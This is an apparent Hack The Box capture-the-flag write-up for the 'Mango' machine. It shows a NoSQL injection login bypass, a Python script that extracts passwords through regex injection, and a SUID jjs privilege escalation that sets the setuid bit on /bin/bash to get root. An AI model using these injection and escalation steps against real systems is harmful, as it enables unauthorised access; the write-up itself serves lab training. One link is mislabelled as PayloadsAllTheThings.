---
layout: single
title: Mango - Hack The Box
excerpt: "Mango is a medium box and funny for beginners with a NoSQSL injection in the login page that allows to retrieve the 'username' and the 'password' with a basic python script. Once the credentials are obtained, it is possible to ssh into the box. For privilege escalation, it is possible to look for SUID. It has been used the `jjs`, which is a Java tool that allows to run Java commands, and because of the SUID, the commads run as root (So, it is possible to run a root bash console)."

date: 2022-11-30
classes: wide
header:
  teaser: /assets/images/htb-mango/mango_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - NoSqlInjection
  - SUID
---
![](/assets/images/htb-mango/mango_logo.png)

Mango is a medium box and funny for beginners with a NoSQSL injection in the login page that allows to retrieve the 'username' and the 'password' with a basic python script. Once the credentials are obtained, it is possible to ssh into the box. For privilege escalation, it is possible to look for SUID. It has been used the `jjs`, which is a Java tool that allows to run Java commands, and because of the SUID, the commads run as root (So, it is possible to run a root bash console).

## Enumeration
Using `nmap` it is possible to list three open TCP ports, SSH (22), HTTP (80), and HTTPS (443).
Based on the `OpenSSH` and `Apache` versions, the target machine looks like Ubuntu 18.04, Bionic Beaver.
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](/assets/images/htb-mango/ssl.png)

Port 443 is the port number for the secure version of the `Hypertext Transfer Protocol` used to access secure web pages. As port 443 is open, it is possible to use the `openssl s_client -connect 10.10.10.162:443` to enumerate subdomains, in this case:
- `mango.htb`
- `staging-order.mango.htb`

There is a login page in `staging-order.mango.htb`, one of which can be used to redirect the form request to our `Burp Suite` proxy to examine the ongoing request to the server.

![](/assets/images/htb-mango/loginhtb.png)

It is quite logical going through testing some MangoDB injections since the name of the box looks like a hint. After trying some basic SQL injections, what makes sense is trying some NoSQL injections. [PayloadsAllTheThings](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) has a good list of test injections.

![](/assets/images/htb-mango/Burp_Suite.png)

When sending a request similar to `username[$ne]=0xdf&password[$ne]=0xdf&login=login` in the form, the server returns a 302 redirect to /home.php. This means that could be possible to bruteforce the user and password.

With a python script similar to this one, it is possible to get the user and the password:
- user one: admin
- user two: mango

```python
#!/usr/bin/python3

from pwn import *
import signal, requests, pdb, signal, sys, time, re

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://staging-order.mango.htb/"
characters = string.printable[:-6]
def makeNOSQLInjection():

    password = ""
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando Ataque de Fuerza Bruta")
    time.sleep(2)
    p2 = log.progress("Password")
    while True:
        for character in characters:

            post_data = {
                    'username':'mango',
                    'password[$regex]':'^%s%s.*' %(password,re.escape(character)),
                    'login':'login'
                    }
            p1.status("%s" % post_data)

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
      makeNOSQLInjection()
```

## Reverse shell
With the 'mango' user and password, it is possible to ssh into the host machine (remember that the port 22 is opened).
Once the ssh is established, with a simple `su admin` command it is possible to change to the 'admin' and see the first flag (user.txt)

## Priviledge escalation

One of the first things to do should be looking for SUID privilege with the typical command `find / -user root -perm -4000 2>/dev/null -ls`.
It is possible to see the `jjs`, which is owned by the root but in the admin group. `jjs` is a Java tool that allows to run Java commands, and because of SUID, they run as root.
```
admin@mango:/home/admin$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
0
admin@mango:/home/admin$ /bin/bash -p
bash-4.4# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
bash-4.4# whoami
root
```
